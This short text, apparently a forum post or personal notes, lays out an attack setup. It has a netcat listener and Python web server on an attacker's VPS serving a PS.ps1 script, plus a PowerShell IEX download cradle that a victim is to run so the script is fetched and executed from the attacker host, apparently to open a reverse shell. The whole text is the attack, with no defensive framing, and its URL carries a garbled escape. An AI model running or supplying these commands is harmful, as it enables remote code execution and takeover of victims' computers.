The attacker needs to run this on a vps server 

rlwrap nc -nlvp 443
python3 http.server 80

With this PS.ps1 file in /var/www/html

And the victim has to execute this command in powershell 

powershell IEX(New-Object Net.WebClient).downloadString("http://ipvps/PS.ps1%22)
